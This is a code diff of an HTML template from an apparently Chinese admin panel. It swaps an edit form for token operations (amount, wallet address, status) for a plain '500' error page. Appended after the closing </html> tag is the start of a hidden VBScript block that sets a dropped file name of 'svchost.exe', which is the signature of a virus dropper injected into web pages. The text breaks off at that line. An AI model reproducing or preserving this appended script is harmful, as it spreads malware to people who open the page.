@@ -1,133 +1,37 @@
 <!DOCTYPE html>
-<html>
-  
-  <head>
-    <meta charset="UTF-8">
-    <title>欢迎页面-X-admin2.0</title>
-    <meta name="renderer" content="webkit">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" type="image/x-icon" href="/images/favicon.ico" />
-    <link rel="stylesheet" href="/css/font.css">
-    <link rel="stylesheet" href="/css/xadmin.css">
-    <script type="text/javascript" src="/js/jquery.min.js"></script>
-    <script type="text/javascript" src="/lib/layui/layui.js" charset="utf-8"></script>
-    <script type="text/javascript" src="/js/xadmin.js"></script>
-    <script type="text/javascript" src="/js/operation.js"></script>
-    <script type="text/javascript" src="/js/myPagination.js"></script>
-    <!-- 让IE8/9支持媒体查询，从而兼容栅格 -->
-    <!--[if lt IE 9]>
-      <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
-      <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  </head>
-  
-  <body>
+<html lang="en">
+<head>
+    <title>500</title>
+    <!-- Meta tag Keywords -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="keywords" content="" />
+    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
+    function hideURLbar(){ window.scrollTo(0,1); } </script>
+    <!-- Meta tag Keywords -->
+    <!-- css files -->
+    <link href="/css/style.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
 
-    <div class="x-body">
-      <div class="layui-row">
-        <form class="layui-form layui-col-md12">
-            <input type="hidden" name="id" id="id" th:value="${operation.id}" />
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>姓名
-                </label>
-                <div class="layui-input-inline">
-                    <input type="text" id="admin_name" name="admin_name" required="" lay-verify="required"
-                           style="width: 260px;" autocomplete="off" class="layui-input" th:value="${operation.admin_name}"   />
-                </div>
-            </div>
-
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>操作类型
-                </label>
-                <div class="layui-input-inline">
-                    <input class="layui-input" placeholder="操作类型" name="operation_type" id="operation_type"
-                           required="" lay-verify="required" th:value="${operation.operation_type}" style="width: 260px;">
-                </div>
-            </div>
-
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>代币金额
-                </label>
-                <div class="layui-input-inline">
-                    <input type="text" id="money" name="money" required="" lay-verify="required"
-                           autocomplete="off" class="layui-input" th:value="${operation.money}" style="width: 260px;">
-                </div>
-            </div>
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>用户钱包地址
-                </label>
-                <div class="layui-input-inline">
-                    <input type="text" id="address" name="address" required="" lay-verify="required"
-                           autocomplete="off" class="layui-input" th:value="${operation.address}" style="width: 260px;">
-                </div>
-            </div>
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>操作时间
-                </label>
-                <div class="layui-input-inline">
-                    <input class="layui-input" placeholder="操作时间" name="create_time" id="create_time"
-                           required="" lay-verify="required" th:value="${operation.create_time}" style="width: 260px;">
-                </div>
-            </div>
-
-            <div class="layui-form-item">
-                <label class="layui-form-label" style="width: 260px;">
-                    <span class="x-red">*</span>状态
-                </label>
-                <div class="layui-input-inline">
-                    <select name="state" th:if="${operation.state == 1}">
-                        <option value="1">成功</option>
-                        <option value="0">失败</option>
-                    </select>
-                    <select name="state" th:if="${operation.state == 0}">
-                        <option value="1">成功</option>
-                        <option value="0" selected>失败</option>
-                    </select>
-                </div>
-            </div>
-
-          <div class="layui-form-item">
-            <label class="layui-form-label" style="width: 260px;">
-            </label>
-            <button class="layui-btn" id="edit" lay-filter="add" lay-submit="">
-              保存
-            </button>
-          </div>
-        </form>
-      </div>
+<body>
+<div class="header">
+    <h1>这是一个错误页面</h1>
+</div>
+<div class="w3-main">
+    <div class="agile-info">
+        <h2>500</h2>
+        <h3>请刷新页面或重新登录后再试！</h3>
+        <br>
+        <a href="javascript:;" onclick="refresh()">返回首页</a>
     </div>
+</div>
+</body>
 
-    <script>
-      layui.use('laydate', function(){
-        var laydate = layui.laydate;
-
-        //执行一个laydate实例
-        laydate.render({
-          elem: '#timeInsert' //指定元素
-        });
-
-      });
-
-      layui.use(['form','layer'], function(){
-          $ = layui.jquery;
-          var form = layui.form
-              ,layer = layui.layer;
-
-          //监听提交
-          form.on('submit(add)', function(data){
-              var field = data.field;
-              operationUpdate(field);
-              return false;
-          });
-      });
-
-     </script>
-  </body>
+<script>
+    function refresh() {
+        window.parent.location.href = '/admin/index';
+    }
+</script>
 
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
